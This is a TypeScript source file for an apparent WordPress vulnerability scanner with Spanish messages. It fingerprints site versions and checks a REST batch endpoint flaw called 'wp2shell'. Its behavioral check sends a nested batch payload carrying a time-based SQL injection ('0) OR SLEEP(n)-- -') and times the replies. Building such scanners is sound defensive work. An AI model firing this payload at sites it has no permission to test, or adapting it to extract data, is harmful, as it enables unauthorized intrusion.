export type Version = [number, number, number];

export type VerdictLevel = "vulnerable" | "safe" | "protected" | "unknown";

export interface Verdict {
  level: VerdictLevel;
  title: string;
  detail: string;
}

export interface BatchResult {
  accessible: boolean;
  status: number | null;
}

export interface ScanResult {
  verdict: Verdict;
  signals: string[];
  target: string;
  version: string | null;
  markers: string[];
  batch: BatchResult;
  wpLogin: boolean;
  remediation: string[];
  behavioral: {
    vulnerable: boolean | null;
    signal: string;
    confidence: "high" | "normal" | "reduced";
  } | null;
  behavioralWarning: string | null;
}

export interface SafeFetchResponse {
  body: string;
  status: number;
  headers: Headers;
}

export interface SafeFetchOptions {
  method?: "GET" | "POST";
  body?: string;
  redirectCount?: number;
}

type SafeFetch = (url: string, options?: SafeFetchOptions) => Promise<SafeFetchResponse>;

function parseVersion(input: string): Version | null {
  const cleaned = String(input).replace(/-.*$/, "");
  const match = cleaned.match(/(\d+)\.(\d+)(?:\.(\d+))?/);
  if (!match) return null;
  return [parseInt(match[1], 10), parseInt(match[2], 10), parseInt(match[3] || "0", 10)];
}

function cmpVersion(a: Version, b: Version): number {
  for (let i = 0; i < 3; i++) {
    if (a[i] < b[i]) return -1;
    if (a[i] > b[i]) return 1;
  }
  return 0;
}

const versionLt = (a: Version, b: Version) => cmpVersion(a, b) < 0;
const versionLte = (a: Version, b: Version) => cmpVersion(a, b) <= 0;
const versionGte = (a: Version, b: Version) => cmpVersion(a, b) >= 0;

function computeVerdict(version: Version | null, markersFound: boolean, batch: BatchResult): Verdict {
  const batchAccessible = batch.accessible;
  const batchStatus = batch.status;

  if (markersFound && batchStatus === 403) {
    return {
      level: "protected",
      title: "Protegido por WAF (vulnerabilidad no confirmada)",
      detail:
        "La API batch está bloqueada por un WAF o plugin de seguridad, por lo que no es explotable en este momento. Sin embargo, la vulnerabilidad podría seguir presente en el código de WordPress. Actualiza de todos modos por precaución.",
    };
  }

  if (markersFound && batchStatus === 401) {
    return {
      level: "protected",
      title: "Protegido por autenticación (vulnerabilidad no confirmada)",
      detail:
        "El endpoint batch requiere autenticación. No es explotable sin credenciales, pero la vulnerabilidad podría seguir presente. Actualiza WordPress de todos modos.",
    };
  }

  if (!version) {
    if (markersFound) {
      if (batchAccessible) {
        return {
          level: "unknown",
          title: "Versión no detectada — indicadores de WordPress presentes",
          detail:
            "Se encontraron marcadores de WordPress y el endpoint batch está accesible, pero no se pudo determinar la versión exacta. El sitio podría ser vulnerable.",
        };
      }
      return {
        level: "safe",
        title: "No vulnerable",
        detail:
          "Se encontraron marcadores de WordPress pero el endpoint batch no está accesible o la versión no pudo determinarse.",
      };
    }
    return {
      level: "unknown",
      title: "No parece ser un sitio WordPress",
      detail:
        "No se pudo determinar si este sitio es WordPress. Puede que no sea WordPress o que oculte completamente su identidad.",
    };
  }

  const [maj, min, pat] = version;

  if (versionLt(version, [6, 9, 0])) {
    return {
      level: "safe",
      title: `WordPress ${maj}.${min}.${pat} no está afectada`,
      detail: "Tu versión es anterior a 6.9.0 y no incluye la funcionalidad vulnerable.",
    };
  }

  if (versionGte(version, [6, 9, 0]) && versionLte(version, [6, 9, 4])) {
    return {
      level: "vulnerable",
      title: `WordPress ${maj}.${min}.${pat} es vulnerable a wp2shell`,
      detail:
        "Esta versión está en el rango afectado. Actualiza a 6.9.5 o superior inmediatamente.",
    };
  }

  if (versionGte(version, [6, 9, 5]) && versionLt(version, [7, 0, 0])) {
    return {
      level: "safe",
      title: `WordPress ${maj}.${min}.${pat} está parcheada`,
      detail: "Esta versión de la rama 6.9 contiene la corrección (6.9.5+).",
    };
  }

  if (versionGte(version, [7, 0, 0]) && versionLte(version, [7, 0, 1])) {
    return {
      level: "vulnerable",
      title: `WordPress ${maj}.${min}.${pat} es vulnerable a wp2shell`,
      detail:
        "Esta versión está en el rango afectado. Actualiza a 7.0.2 o superior inmediatamente.",
    };
  }

  if (versionGte(version, [7, 0, 2])) {
    return {
      level: "safe",
      title: `WordPress ${maj}.${min}.${pat} está parcheada`,
      detail: "Esta versión contiene la corrección (7.0.2+). Tu sitio está protegido.",
    };
  }

  return {
    level: "unknown",
    title: `WordPress ${maj}.${min}.${pat} detectada`,
    detail: "No se puede determinar si esta versión está afectada.",
  };
}

function buildRemediation(verdict: Verdict): string[] {
  if (verdict.level === "safe") {
    return [
      "Continúa manteniendo WordPress actualizado con las últimas versiones de seguridad.",
      "Monitoriza el blog de seguridad de WordPress para nuevas vulnerabilidades.",
      "Mantén un WAF o plugin de seguridad para bloquear tráfico sospechoso a la API REST.",
    ];
  }

  if (verdict.level === "unknown") {
    return [
      "Verifica manualmente la versión de WordPress desde el panel de administración (Escritorio → Actualizaciones).",
      "Si la versión es 6.9.0–6.9.4 o 7.0.0–7.0.1, actualiza inmediatamente.",
      "Instala una regla WAF para bloquear /wp-json/batch/v1 y ?rest_route=/batch/v1.",
      "Vuelve a ejecutar este comprobador una vez confirmada la versión.",
    ];
  }

  if (verdict.level === "protected") {
    return [
      "Actualiza WordPress a 7.0.2 (o 6.9.5 si estás en la rama 6.9) — el WAF protege la explotación en este momento, pero la vulnerabilidad sigue presente en el código de WordPress.",
      "Mantén la regla WAF o plugin de seguridad que bloquea /wp-json/batch/v1 y ?rest_route=/batch/v1.",
      "Verifica periódicamente que el WAF siga activo — si se deshabilita, el sitio quedaría expuesto.",
      "Considera instalar el plugin »Disable WP REST API« como defensa en profundidad.",
    ];
  }

  return [
    "Actualiza WordPress a 7.0.2 (o 6.9.5 si estás en la rama 6.9) inmediatamente.",
    "Instala el plugin »Disable WP REST API« para bloquear el uso no autenticado de la API REST.",
    "Usa un WAF para bloquear la ruta /wp-json/batch/v1 y el parámetro rest_route=/batch/v1.",
    "Copia el plugin de mitigación en wp-content/plugins/disable-batch-api-for-unauth.php y actívalo.",
    "Rota cualquier secreto que pueda haber sido expuesto y audita los logs de acceso.",
  ];
}

interface HomepageResult {
  versionHits: { version: Version; source: string }[];
  signals: string[];
}

async function detectAllFromHomepage(
  baseUrl: string,
  fetchFn: SafeFetch
): Promise<HomepageResult> {
  const versionHits: { version: Version; source: string }[] = [];
  const signals: string[] = [];

  try {
    const { body, headers } = await fetchFn(`${baseUrl}/`);

    const metaMatch = body.match(
      /<meta\s+name=["']generator["']\s+content=["']WordPress\s+([\d.-]+)["']/i
    );
    if (metaMatch) {
      const version = parseVersion(metaMatch[1]);
      if (version) versionHits.push({ version, source: "meta generator (página principal)" });
    }

    const wpIncAssetRegex = /wp-includes\/[^"'\s?]*[?&]ver=(\d+\.\d+(?:\.\d+)?)/gi;
    let assetMatch;
    const assetVersions = new Map<string, { version: Version; source: string }>();
    while ((assetMatch = wpIncAssetRegex.exec(body)) !== null) {
      const fullUrl = assetMatch[0];
      const fileName = fullUrl.split("/").pop()?.split("?")[0] || "";
      const ver = assetMatch[1];
      const version = parseVersion(ver);
      if (version && !assetVersions.has(fileName)) {
        assetVersions.set(fileName, { version, source: fileName });
      }
    }

    if (assetVersions.size > 0) {
      const emoji = assetVersions.get("wp-emoji-release.min.js");
      if (emoji) {
        versionHits.push({
          version: emoji.version,
          source: "asset wp-includes (wp-emoji-release.min.js)",
        });
      } else {
        // Seleccionar la versión más alta entre todos los assets wp-includes
        // para evitar falsos posititos de plugins/themes con versiones antiguas.
        let highest: { version: Version; source: string } | null = null;
        for (const entry of assetVersions.values()) {
          if (!highest || cmpVersion(entry.version, highest.version) > 0) {
            highest = entry;
          }
        }
        if (highest)
          versionHits.push({
            version: highest.version,
            source: `asset wp-includes (${highest.source})`,
          });
      }
    }

    const pingback = headers.get?.("x-pingback") ?? headers.get?.("X-Pingback") ?? "";
    if (pingback)
      signals.push("El header HTTP X-Pingback está presente (indica WordPress).");

    const linkHeader = headers.get?.("link") ?? headers.get?.("Link") ?? "";
    if (linkHeader && /\/wp-json\//.test(linkHeader)) {
      signals.push("El header HTTP Link apunta a la API REST de WordPress.");
    }
  } catch {
    /* ignored */
  }

  return { versionHits, signals };
}

async function detectFromFeed(
  baseUrl: string,
  fetchFn: SafeFetch
): Promise<{ version: Version; source: string } | null> {
  const feedUrls = [`${baseUrl}/?feed=rss2`, `${baseUrl}/feed/`];

  const results = await Promise.allSettled(
    feedUrls.map(async (url) => {
      const { body } = await fetchFn(url);

      const genMatch = body.match(
        /<generator[^>]*>https?:\/\/\S+\?v=(\d+\.\d+(?:\.\d+)?)<\/generator>/i
      );
      if (genMatch) {
        const version = parseVersion(genMatch[1]);
        if (version) return { version, source: `feed RSS (${new URL(url).pathname})` };
      }

      const generatorMatch = body.match(/<generator>WordPress\s+([\d.-]+)<\/generator>/i);
      if (generatorMatch) {
        const version = parseVersion(generatorMatch[1]);
        if (version) return { version, source: `feed RSS (${new URL(url).pathname})` };
      }

      return null;
    })
  );

  for (const result of results) {
    if (result.status === "fulfilled" && result.value) {
      return result.value;
    }
  }
  return null;
}

async function detectFromReadme(
  baseUrl: string,
  fetchFn: SafeFetch
): Promise<{ version: Version; source: string } | null> {
  try {
    const { body, status } = await fetchFn(`${baseUrl}/readme.html`);
    if (status === 404) return null;

    const h1Match = body.match(
      /<h1[^>]*id=["']logo["'][^>]*>[^<]*WordPress\s+([\d.]+)[^<]*<\/h1>/i
    );
    if (h1Match) {
      const version = parseVersion(h1Match[1]);
      if (version) return { version, source: "readme.html" };
    }

    const h1Generic = body.match(/<h1[^>]*>[^<]*WordPress\s+([\d.]+)[^<]*<\/h1>/i);
    if (h1Generic) {
      const version = parseVersion(h1Generic[1]);
      if (version) return { version, source: "readme.html" };
    }

    const strongMatch = body.match(/<strong>\s*WordPress\s+([\d.]+)/i);
    if (strongMatch) {
      const version = parseVersion(strongMatch[1]);
      if (version) return { version, source: "readme.html" };
    }
  } catch {
    /* ignored */
  }
  return null;
}

async function detectFromWpJson(
  baseUrl: string,
  fetchFn: SafeFetch
): Promise<{ version: Version; source: string } | null> {
  try {
    const { body } = await fetchFn(`${baseUrl}/wp-json/`);
    const data = JSON.parse(body);
    if (data?.endpoints?.[0]?.version) {
      const version = parseVersion(data.endpoints[0].version);
      if (version) return { version, source: "API REST /wp-json/" };
    }

    const headerMatch = body.match(/X-WP-Version["']?\s*:\s*['"]?([\d.]+)/i);
    if (headerMatch) {
      const version = parseVersion(headerMatch[1]);
      if (version) return { version, source: "API REST /wp-json/" };
    }
  } catch {
    /* ignored */
  }
  return null;
}

async function detectMarkers(baseUrl: string, fetchFn: SafeFetch): Promise<string[]> {
  const markerPaths = ["/wp-content/", "/wp-includes/", "/wp-json/", "/wp-admin/"];
  const results = await Promise.allSettled(
    markerPaths.map(async (path) => {
      const { status } = await fetchFn(`${baseUrl}${path}`);
      return { path, status };
    })
  );

  const found: string[] = [];
  for (const result of results) {
    if (result.status === "fulfilled" && result.value.status !== 404) {
      found.push(result.value.path.replace(/\//g, ""));
    }
  }

  return found;
}

async function probeBatchEndpoint(
  baseUrl: string,
  fetchFn: SafeFetch
): Promise<BatchResult> {
  let status: number | null = null;

  // Probar ambas rutas: /wp-json/batch/v1 y /?rest_route=/batch/v1/
  const urls = [
    `${baseUrl}/wp-json/batch/v1`,
    `${baseUrl}/?rest_route=/batch/v1/`,
  ];

  for (const url of urls) {
    try {
      const result = await fetchFn(url, { method: "POST" });
      status = result.status;
    } catch {
      try {
        const result = await fetchFn(url);
        status = result.status;
      } catch {
        continue;
      }
    }

    if (status === 403) return { accessible: false, status: 403 };
    if (
      status === 200 ||
      status === 207 ||
      status === 400 ||
      status === 401 ||
      status === 405 ||
      status === 406 ||
      status === 415 ||
      status === 422
    ) {
      return { accessible: true, status };
    }
    if (status === 404) continue; // probar la otra ruta
  }

  if (status === 404) return { accessible: false, status: 404 };
  return { accessible: false, status };
}

async function detectWpLogin(baseUrl: string, fetchFn: SafeFetch): Promise<boolean> {
  try {
    const { status } = await fetchFn(`${baseUrl}/wp-login.php`);
    return status === 200;
  } catch {
    return false;
  }
}

function median(values: number[]): number {
  const sorted = [...values].sort((a, b) => a - b);
  const mid = Math.floor(sorted.length / 2);
  return sorted.length % 2 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
}

function buildNestedBatchPayload(authorNotInValue: string): object {
  const encoded = encodeURIComponent(authorNotInValue);
  const inner = {
    validation: "normal",
    requests: [
      { method: "POST", path: "///" },
      { method: "GET", path: `/wp/v2/users?author_exclude=${encoded}` },
      { method: "GET", path: "/wp/v2/posts" },
    ],
  };
  return {
    validation: "normal",
    requests: [
      { method: "POST", path: "///" },
      { method: "POST", path: "/wp/v2/posts", body: inner },
      { method: "POST", path: "/batch/v1", body: { requests: [] } },
    ],
  };
}

async function preFlightCheck(
  baseUrl: string,
  fetchFn: SafeFetch
): Promise<{ safe: boolean; reason?: string }> {
  // ─── SAFETY ANALYSIS — Static review against WordPress 6.9.4 source code
  //     (class-wp-rest-posts-controller.php, lines 684-728)
  //
  // The behavioral check sends a nested batch payload whose outer request is
  // POST /wp/v2/posts. We must guarantee this cannot create a real post on
  // the scanned site.
  //
  // SCENARIO 1 — Vulnerable WordPress (6.9.0-6.9.4):
  //   The route-confusion bug deserializes the outer POST /wp/v2/posts as a
  //   batch request. create_item() is NEVER called. The inner batch executes
  //   GETs + SLEEP. READ-ONLY. No post created.
  //
  // SCENARIO 2 — Patched WordPress + anonymous user (default):
  //   create_item_permissions_check() runs BEFORE create_item() and calls
  //   current_user_can( $post_type->cap->create_posts ) at line 711.
  //   Anonymous user lacks create_posts → WP_Error('rest_cannot_create',
  //   status=401). create_item() is NEVER called. Body NEVER processed.
  //   No post created.
  //
  // SCENARIO 3 — Patched WordPress + plugin grants edit_posts to anonymous:
  //   Pre-flight GET /wp-json/wp/v2/posts?context=edit returns 200
  //   (get_items_permissions_check() at line 164 requires edit_posts for
  //   context=edit). We ABORT. No payload sent. No post created.
  //
  // SCENARIO 4 — Patched WordPress + plugin grants create_posts to anonymous
  //   WITHOUT granting edit_posts (no known plugin does this; would be a
  //   severe misconfiguration on its own):
  //   Pre-flight GET context=edit returns 401 (no edit_posts) → we proceed.
  //   The nested batch is processed normally (no route confusion, patched).
  //   The outer POST /wp/v2/posts reaches create_item_permissions_check() →
  //   current_user_can(create_posts) → TRUE (plugin granted it).
  //   create_item() runs. prepare_item_for_database() reads the body: our
  //   body contains {"validation":"normal","requests":[...]} — none of these
  //   match valid post fields (title, content, excerpt, status, etc.).
  //   WordPress ignores unknown fields. wp_insert_post() receives a stdClass
  //   with only post_type set. Result: auto-draft post with:
  //     • post_title: "" (empty)
  //     • post_content: "" (empty)
  //     • post_status: "auto-draft" (NOT public, NOT visible on frontend)
  //   HTTP 201 returned.
  //
  //   NATURE OF THE auto-draft SIDE EFFECT:
  //     • Status "auto-draft" is invisible on the public frontend.
  //     • WordPress creates auto-drafts during normal operation (every time
  //       a user opens the post editor, one is created).
  //     • wp_delete_auto_drafts() (wp-cron, daily) removes auto-drafts older
  //       than 7 days.
  //     • No email, no RSS entry, no cache invalidation triggered.
  //
  //   WHY WE CANNOT DETECT THIS WITHOUT REPRODUCING IT:
  //     There is no REST API endpoint that exposes the current user's
  //     capabilities. The only way to know if anonymous has create_posts is
  //     to attempt a create and observe the response. A pre-flight POST
  //     would itself create the auto-draft we are trying to detect.
  //     This is a fundamental limitation of the WordPress REST API.
  //
  //   MITIGATION:
  //     • Pre-flight catches scenario 3 (the common misconfiguration).
  //     • Scenario 4 requires a rare plugin configuration.
  //     • If scenario 4 occurs, the side effect is one invisible auto-draft
  //       that self-deletes within 7 days.
  //     • The user-facing report includes a note explaining this possibility.

  try {
    const { status } = await fetchFn(
      `${baseUrl}/wp-json/wp/v2/posts?context=edit`
    );
    if (status === 200) {
      return {
        safe: false,
        reason:
          "El sitio permite edición anónima de posts (context=edit respondió 200). Prueba abortada por seguridad.",
      };
    }
  } catch {
    /* 401/403 esperado para anónimo sin edit_posts — continuar */
  }

  return { safe: true };
}

async function behavioralCheck(
  baseUrl: string,
  fetchFn: SafeFetch
): Promise<{ vulnerable: boolean | null; signal: string; confidence: "high" | "normal" | "reduced" }> {
  // Pre-flight de seguridad: no enviar el payload si el sitio permite
  // edición anónima de posts (escenario 3 del safety analysis).
  const preFlight = await preFlightCheck(baseUrl, fetchFn);
  if (!preFlight.safe) {
    return { vulnerable: null, confidence: "reduced", signal: preFlight.reason ?? "Prueba abortada por seguridad." };
  }

  // Probar ambas rutas: rest_route (usada por el checker oficial) y wp-json
  const batchUrls = [
    `${baseUrl}/?rest_route=/batch/v1/`,
    `${baseUrl}/wp-json/batch/v1`,
  ];

  // Descubrir qué ruta acepta el payload anidado
  let workingUrl: string | null = null;
  const probeBody = JSON.stringify(buildNestedBatchPayload("SLEEP(0)"));
  for (const url of batchUrls) {
    try {
      await fetchFn(url, { method: "POST", body: probeBody });
      workingUrl = url;
      break;
    } catch {
      continue;
    }
  }

  if (!workingUrl) {
    // El WAF puede bloquear el payload anidado pero permitir el probe simple.
    // Verificar si el probe simple funciona → el WAF bloquea el exploit → safe.
    for (const url of batchUrls) {
      try {
        const { status } = await fetchFn(url, { method: "POST" });
        if (status === 403 || status === 401) {
          return {
            vulnerable: false,
            confidence: "reduced",
            signal: `Prueba conductual: el WAF bloqueó el payload de prueba en ${url} (HTTP ${status}). El endpoint batch no es explotable desde esta red.`,
          };
        }
      } catch {
        continue;
      }
    }
    return {
      vulnerable: null,
      confidence: "reduced",
      signal:
        "Prueba conductual no disponible: ninguna de las rutas batch aceptó las peticiones. Posible WAF o timeout de red bloqueando el escaneo.",
    };
  }

  const takeSamples = async (
    sleepSec: number,
    count: number
  ): Promise<{ times: number[]; blocked: boolean }> => {
    const times: number[] = [];
    for (let i = 0; i < count; i++) {
      const value = `0) OR SLEEP(${sleepSec})-- -`;
      const body = JSON.stringify(buildNestedBatchPayload(value));
      const t0 = Date.now();
      try {
        const { status } = await fetchFn(workingUrl!, { method: "POST", body });
        if (status === 403 || status === 401) {
          return { times, blocked: true };
        }
        times.push(Date.now() - t0);
      } catch {
        // network error, skip this sample
      }
    }
    return { times, blocked: false };
  };

  // Warm-up de conexión (absorbe overhead TLS/DNS)
  await takeSamples(0, 1);

  // Adaptativo: si la red es muy lenta (>5s para SLEEP(0)), reducir
  // muestras para no exceder el timeout de 30s de Vercel.
  const probe = await takeSamples(0, 1);
  const slowNetwork =
    probe.times.length > 0 && probe.times[0] > 5000;
  const sampleCount = slowNetwork ? 1 : 2;

  // ─── Ronda 1: baseline SLEEP(0) vs SLEEP(3) ───────────────────────
  const base1 = await takeSamples(0, sampleCount);
  if (base1.blocked) {
    return {
      vulnerable: null,
      confidence: "reduced",
      signal:
        "Prueba conductual: el WAF bloqueó la petición de referencia (SLEEP pattern detectado). Prueba abortada.",
    };
  }
  if (base1.times.length < (sampleCount > 1 ? 2 : 1)) {
    return {
      vulnerable: null,
      confidence: "reduced",
      signal:
        "Prueba conductual no disponible: muestras de referencia insuficientes.",
    };
  }
  const base1Median = median(base1.times);

  const sleep3 = await takeSamples(3, sampleCount);
  if (sleep3.blocked) {
    return {
      vulnerable: null,
      confidence: "reduced",
      signal:
        "El WAF bloqueó el payload con patrón SQLi (SLEEP(3)-- -). El batch endpoint es parcialmente accesible pero los payloads de inyección son filtrados.",
    };
  }
  if (sleep3.times.length < (sampleCount > 1 ? 2 : 1)) {
    return {
      vulnerable: null,
      confidence: "reduced",
      signal:
        "Prueba conductual no disponible: muestras SLEEP(3) insuficientes.",
    };
  }
  const sleep3Median = median(sleep3.times);

  const delta1 = (sleep3Median - base1Median) / 1000;

  // THRESHOLD RATIONALE (2.0s):
  // SLEEP(3) on a vulnerable site adds ~3s to response time.
  // Network RTT (Vercel → target) is typically 0.1-1.0s.
  // Server processing adds ~0.1-0.5s.
  // So baseline SLEEP(0) ≈ 0.2-1.5s, SLEEP(3) ≈ 3.2-4.5s → delta ≈ 2-4s.
  // On non-vulnerable sites SLEEP is ignored → delta ≈ 0s.
  // 2.0s threshold has margin: >0s (safe) and <2s (vuln minimum).
  // If production shows false negatives, lower to 1.5s.
  // If false positives from heavy jitter, raise to 2.5s.
  const threshold = 2.0;

  // ─── Ronda 2: re-baseline + SLEEP(6) para confirmación escalar ───
  // Re-baseline normaliza contra condiciones de red actuales (carga,
  // rate-limiting, jitter) en vez de asumir que son iguales que hace 10s.
  const base2 = await takeSamples(0, sampleCount);
  if (base2.times.length < (sampleCount > 1 ? 2 : 1)) {
    // No se pudo completar la ronda de confirmación. Reportar ronda 1
    // con confianza normal, sin confirmación.
    if (delta1 >= threshold) {
      return {
        vulnerable: true,
        confidence: "normal",
        signal: `[confianza normal — ${sampleCount} muestra(s)] Prueba conductual POSITIVA: SLEEP(3) tardó ${(sleep3Median / 1000).toFixed(1)}s vs ${(base1Median / 1000).toFixed(1)}s de referencia (Δ=${delta1.toFixed(1)}s, umbral ${threshold}s). Confirmación SLEEP(6) no disponible — red lenta.`,
      };
    }
    return {
      vulnerable: null,
      confidence: "reduced",
      signal:
        "Prueba conductual no disponible: no se pudo completar la ronda de confirmación.",
    };
  }
  const base2Median = median(base2.times);

  const sleep6 = await takeSamples(6, sampleCount);
  if (sleep6.blocked) {
    // Ronda 1 positiva pero ronda 2 bloqueada por WAF
    if (delta1 >= threshold) {
      return {
        vulnerable: true,
        confidence: "normal",
        signal: `[confianza normal — ${sampleCount} muestra(s)] Prueba conductual POSITIVA: SLEEP(3) Δ=${delta1.toFixed(1)}s. Confirmación SLEEP(6) bloqueada por WAF.`,
      };
    }
    return {
      vulnerable: null,
      confidence: "reduced",
      signal:
        "El WAF bloqueó la confirmación SLEEP(6). No se pudo completar la prueba.",
    };
  }
  if (sleep6.times.length < (sampleCount > 1 ? 2 : 1)) {
    if (delta1 >= threshold) {
      return {
        vulnerable: true,
        confidence: "normal",
        signal: `[confianza normal — ${sampleCount} muestra(s)] Prueba conductual POSITIVA: SLEEP(3) Δ=${delta1.toFixed(1)}s. Confirmación SLEEP(6) no disponible — muestras insuficientes.`,
      };
    }
    return {
      vulnerable: null,
      confidence: "reduced",
      signal:
        "Prueba conductual no disponible: muestras SLEEP(6) insuficientes.",
    };
  }
  const sleep6Median = median(sleep6.times);

  const delta2 = (sleep6Median - base2Median) / 1000;
  const scalingRatio = delta2 / Math.max(delta1, 0.1);

  // Ambas rondas negativas → no vulnerable
  if (delta1 < threshold && delta2 < threshold * 2) {
    return {
      vulnerable: false,
      confidence: "high",
      signal: `[confianza alta — ${sampleCount}+${sampleCount} muestras] Prueba conductual negativa: SLEEP(3) Δ=${delta1.toFixed(1)}s, SLEEP(6) Δ=${delta2.toFixed(1)}s. Ambos sin diferencia significativa.`,
    };
  }

  // Ronda 1 positiva + ronda 2 confirma con escalamiento proporcional
  if (
    delta1 >= threshold &&
    delta2 >= threshold * 2 &&
    scalingRatio >= 1.5 &&
    scalingRatio <= 3.0
  ) {
    return {
      vulnerable: true,
      confidence: "high",
      signal: `[confianza alta — ${sampleCount}+${sampleCount} muestras] Prueba conductual CONFIRMADA: SLEEP(3) Δ=${delta1.toFixed(1)}s, SLEEP(6) Δ=${delta2.toFixed(1)}s (ratio ${scalingRatio.toFixed(2)}). El sitio ES vulnerable.`,
    };
  }

  // Ronda 1 positiva pero ronda 2 no escala proporcionalmente
  if (delta1 >= threshold) {
    return {
      vulnerable: true,
      confidence: "normal",
      signal: `[confianza normal — ${sampleCount} muestra(s)] Prueba conductual POSITIVA: SLEEP(3) Δ=${delta1.toFixed(1)}s. Confirmación SLEEP(6) no escaló proporcionalmente (Δ=${delta2.toFixed(1)}s, ratio ${scalingRatio.toFixed(2)}). Posible jitter de red.`,
    };
  }

  // Ronda 1 negativa pero ronda 2 positiva (inconsistente)
  return {
    vulnerable: null,
    confidence: "reduced",
    signal: `Prueba conductual inconclusa: SLEEP(3) Δ=${delta1.toFixed(1)}s (negativo) pero SLEEP(6) Δ=${delta2.toFixed(1)}s (positivo). Resultados inconsistentes.`,
  };
}

export async function runScan(baseUrl: string, fetchFn: SafeFetch): Promise<ScanResult> {
  const results = await Promise.allSettled([
    detectAllFromHomepage(baseUrl, fetchFn),
    detectFromFeed(baseUrl, fetchFn),
    detectFromReadme(baseUrl, fetchFn),
    detectFromWpJson(baseUrl, fetchFn),
    probeBatchEndpoint(baseUrl, fetchFn),
    detectWpLogin(baseUrl, fetchFn),
    detectMarkers(baseUrl, fetchFn),
  ]);

  const homepageResult = results[0];
  const feedResult = results[1];
  const readmeResult = results[2];
  const wpJsonResult = results[3];
  const batchResult = results[4];
  const wpLoginResult = results[5];
  const markersResult = results[6];

  let detectedVersion: Version | null = null;
  const signals: string[] = [];

  if (homepageResult.status === "fulfilled") {
    for (const hit of homepageResult.value.versionHits) {
      signals.push(`Versión detectada: ${hit.version.join(".")} (vía ${hit.source}).`);
      if (!detectedVersion) detectedVersion = hit.version;
    }
    for (const sig of homepageResult.value.signals) signals.push(sig);
  }

  for (const result of [feedResult, readmeResult, wpJsonResult]) {
    if (result.status === "fulfilled" && result.value) {
      signals.push(
        `Versión detectada: ${result.value.version.join(".")} (vía ${result.value.source}).`
      );
      if (!detectedVersion) detectedVersion = result.value.version;
    }
  }

  // Sanity check: si el endpoint batch está presente, WordPress es ≥ 6.9.0.
  // Descartar versiones detectadas < 6.9.0 como falsos posititos de plugins/themes.
  const batch: BatchResult =
    batchResult.status === "fulfilled"
      ? batchResult.value
      : { accessible: false, status: null };

  if (detectedVersion && batch.accessible && versionLt(detectedVersion, [6, 9, 0])) {
    signals.push(
      `Versión detectada ${detectedVersion.join(".")} descartada: el endpoint batch está presente, lo que requiere WordPress ≥ 6.9.0.`
    );
    detectedVersion = null;

    // Buscar una versión alternativa ≥ 6.9.0 en los resultados de homepage
    if (homepageResult.status === "fulfilled") {
      for (const hit of homepageResult.value.versionHits) {
        if (versionGte(hit.version, [6, 9, 0])) {
          detectedVersion = hit.version;
          signals.push(`Versión corregida a ${hit.version.join(".")} (vía ${hit.source}).`);
          break;
        }
      }
    }

    // Buscar en feed, readme, wp-json
    if (!detectedVersion) {
      for (const result of [feedResult, readmeResult, wpJsonResult]) {
        if (result.status === "fulfilled" && result.value && versionGte(result.value.version, [6, 9, 0])) {
          detectedVersion = result.value.version;
          signals.push(
            `Versión corregida a ${result.value.version.join(".")} (vía ${result.value.source}).`
          );
          break;
        }
      }
    }

    // Si no queda ninguna versión confiable, marcar como desconocida.
    // NO inferir 6.9.0: el sitio podría estar parcheado (6.9.5+) y
    // falsear su versión, como en ifop.cl (reporta 6.6.1 pero batch existe).
    if (!detectedVersion) {
      signals.push(
        "No se pudo determinar la versión exacta. El endpoint batch está presente (WP ≥ 6.9.0), pero no podemos confirmar si el sitio es vulnerable sin conocer la versión real. Verifica manualmente."
      );
    }
  }

  const markersFound =
    markersResult.status === "fulfilled" ? markersResult.value : [];
  const wpLogin =
    wpLoginResult.status === "fulfilled" ? wpLoginResult.value : false;

  if (markersFound.length > 0) {
    signals.push(`Marcadores de WordPress encontrados (${markersFound.join(", ")}).`);
  }

  if (wpLogin && !markersFound.includes("wp-login")) {
    signals.push(
      "La página de login /wp-login.php está presente (indica WordPress)."
    );
  }

  if (batch.status === 403) {
    signals.push(
      "El sondeo batch devolvió HTTP 403 (la API batch está bloqueada por un WAF o plugin de seguridad)."
    );
  } else if (batch.status === 401) {
    signals.push(
      "El endpoint /wp-json/batch/v1 requiere autenticación (HTTP 401). No es explotable sin credenciales."
    );
  } else if (batch.accessible) {
    signals.push(
      `El endpoint /wp-json/batch/v1 está accesible (estado HTTP ${batch.status}).`
    );
  } else if (batch.status === 404) {
    signals.push("El endpoint /wp-json/batch/v1 devolvió 404 (no disponible).");
  } else {
    signals.push("No se pudo comprobar el endpoint /wp-json/batch/v1.");
  }

  if (!detectedVersion) {
    signals.unshift(
      "No se encontró la versión de WordPress mediante los métodos de detección (meta generator, assets, feed RSS, readme.html, API REST)."
    );
  }

  // Prueba conductual (SLEEP oracle): siempre que el batch sea accesible.
  // La versión es señal corroborante, no motivo para saltarse la confirmación activa.
  let behavioralResult: { vulnerable: boolean | null; signal: string; confidence: "high" | "normal" | "reduced" } | null = null;
  if (batch.accessible) {
    behavioralResult = await behavioralCheck(baseUrl, fetchFn);
    if (behavioralResult.signal) signals.push(behavioralResult.signal);
  }

  let verdict: Verdict;
  if (behavioralResult?.vulnerable === true) {
    verdict = {
      level: "vulnerable",
      title: "Vulnerable — confirmado por prueba conductual",
      detail:
        "La prueba de inyección SLEEP confirmó que el endpoint batch es vulnerable a la inyección SQL. Actualiza WordPress inmediatamente.",
    };
  } else if (behavioralResult?.vulnerable === false) {
    verdict = {
      level: "safe",
      title: "No vulnerable — prueba conductual negativa",
      detail:
        "La prueba de inyección SLEEP no mostró diferencia de tiempo. El sitio no es vulnerable a la inyección SQL del batch endpoint, o ya está parcheado.",
    };
  } else {
    verdict = computeVerdict(detectedVersion, markersFound.length > 0, batch);
  }
  const remediation = buildRemediation(verdict);

  const behavioralWarning = behavioralResult
    ? "NOTA DE SEGURIDAD — Prueba conductual: este escáner envió un payload " +
      "SLEEP anidado al endpoint batch. En sitios vulnerables, el route-confusion " +
      "desvía el payload y no se crean posts. En sitios parcheados, WordPress " +
      "rechaza la petición por permisos (anónimo no tiene create_posts). " +
      "CASO EXTREMO (muy improbable): si el sitio otorga create_posts a anónimos " +
      "sin edit_posts, la prueba podría crear un post auto-draft vacío (invisible, " +
      "sin título, sin contenido) que WordPress elimina automáticamente tras 7 días."
    : null;

  return {
    verdict,
    signals,
    target: baseUrl,
    version: detectedVersion ? detectedVersion.join(".") : null,
    markers: markersFound,
    batch,
    wpLogin,
    remediation,
    behavioral: behavioralResult,
    behavioralWarning,
  };
}
